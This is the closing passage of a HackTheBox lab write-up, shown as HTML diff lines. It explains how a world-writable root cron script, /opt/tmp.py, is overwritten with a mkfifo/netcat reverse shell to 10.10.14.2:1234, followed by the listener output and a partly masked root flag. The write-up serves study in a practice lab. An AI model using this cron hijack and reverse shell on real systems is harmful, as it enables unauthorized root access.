+<div class="highlight"><pre><span></span><span class="err">============================================================( file system )=====                                                                                                              </span>
+<span class="err">[*] fst000 Writable files outside user&#39;s home.............................. yes!                                                                                                              </span>
+<span class="err">---                                                                                                                                                                                           </span>
+<span class="err">/var/tmp                                                                                                                                                                                      </span>
+<span class="err">/opt/tmp.py                                                                                                                                                                                   </span>
+<span class="err">/tmp                                                                                                                                                                                          </span>
+<span class="err">/tmp/.X11-unix                                                                                                                                                                                </span>
+<span class="err">/tmp/.XIM-unix                                                                                                                                                                                </span>
+<span class="err">/tmp/.font-unix                                                                                                                                                                               </span>
+<span class="err">/tmp/.ICE-unix                                                                                                                                                                                </span>
+<span class="err">/tmp/.ICE-unix/645                                                                                                                                                                            </span>
+<span class="err">/tmp/.Test-unix                                                                                                                                                                               </span>
+<span class="err">---                                                                           </span>
+</pre></div>
+
+
+<p>The python script /opt/tmp.py contains the following code:</p>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
+2
+3
+4
+5
+6
+7</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env python</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="k">try</span><span class="p">:</span>
+     <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;rm -r /tmp/* &#39;</span><span class="p">)</span>
+<span class="k">except</span><span class="p">:</span>
+     <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
+</pre></div>
+</td></tr></table>
+
+<p>Usually these kind of scripts runs at regular intervals to make sure the directory is clean. However, if we find a cronjob we need to hope the interval is not too long.</p>
+<p>The global crontab file does not contain anything related to tmp.py so the only other place where the cron job could be present is root's private cron file, /var/spool/cron/crontabs/root.</p>
+<p>Obviously we don't have access to that file so I created a file in the /tmp directory. After a couple of minutes I noticed the file disappeared so we are in a very good position because we can modify that file and place a shell in there. </p>
+<p>All I have to do it to replace the command </p>
+<h3>'rm -r /tmp/* '</h3>
+<p>with the following shell I got from <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">pentestmonkey shell cheatsheet</a>:</p>
+<h3>'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.2 1234 &gt;/tmp/f')</h3>
+<p>So I modified the tmp.py by replacing the command and started a netcat listener on my kali box listening on port 1234. After waiting a couple of minutes we finally get the shell:</p>
+<div class="highlight"><pre><span></span><span class="n">root</span><span class="nv">@Kali</span><span class="err">:</span><span class="o">~</span><span class="err">#</span><span class="w"> </span><span class="n">nc</span><span class="w"> </span><span class="o">-</span><span class="n">lvnp</span><span class="w"> </span><span class="mi">1234</span><span class="w"></span>
+<span class="n">listening</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="o">[</span><span class="n">any</span><span class="o">]</span><span class="w"> </span><span class="mi">1234</span><span class="w"> </span><span class="p">...</span><span class="w"></span>
+<span class="k">connect</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="o">[</span><span class="n">10.10.14.2</span><span class="o">]</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="p">(</span><span class="k">UNKNOWN</span><span class="p">)</span><span class="w"> </span><span class="o">[</span><span class="n">10.10.10.51</span><span class="o">]</span><span class="w"> </span><span class="mi">36004</span><span class="w"></span>
+<span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="nl">sh</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="err">:</span><span class="w"> </span><span class="n">can</span><span class="err">&#39;</span><span class="n">t</span><span class="w"> </span><span class="n">access</span><span class="w"> </span><span class="n">tty</span><span class="p">;</span><span class="w"> </span><span class="n">job</span><span class="w"> </span><span class="n">control</span><span class="w"> </span><span class="n">turned</span><span class="w"> </span><span class="k">off</span><span class="w"></span>
+<span class="err">#</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="n">root</span><span class="p">.</span><span class="n">txt</span><span class="w"></span>
+<span class="n">b4</span><span class="err">##########################</span><span class="n">##c9</span><span class="w"></span>
+</pre></div>
+      </div><!-- .entry-content -->
+      <br /><br />
+      <div class="article_meta">
+        Tags:
+          <a href="https://sittingducks.io/tag/hackthebox.html">HackTheBox</a>      </div>
+    </div>
+  </div>
+</article><!-- #post-## -->
+                </div>
+              </div><!-- #main -->
+          </div><!-- #primary -->
+        </div>
+      </div><!-- close .row -->
+    </div><!-- close .container -->
+  </div><!-- close .site-content -->
+
+
+
+
+  <div id="footer-area">
+    <footer id="colophon" class="site-footer" role="contentinfo">
+      <div class="site-info container">
+        <div class="row">
+                    <div class="copyright col-md-12">
+                    <a href="https://sittingducks.io/pages/privacy-policy">Privacy Policy</a> | 
+                    <a href="https://sittingducks.io/feeds/all.atom.xml">Atom Feed</a> | 
+                    <a href="https://sittingducks.io/sitemap.xml">Sitemap</a><br />                    &copy; 2019 <a href="https://sittingducks.io">Marco Meli</a> </div>
+        </div>
+      </div><!-- .site-info -->
+      <div class="scroll-to-top" style="display: none;"><i class="fa fa-angle-up"></i></div><!-- .scroll-to-top -->
+    </footer><!-- #colophon -->
+  </div>
+
+  <script type="text/javascript">
+    window.addEventListener('load', function(){
+    if (window.location.pathname != '/' && window.location.pathname != '/index.html'){
+      window.scroll(0, document.getElementById('main').offsetTop);
+    }})
+  </script>
+
+
+
+
+</body>
+</html>
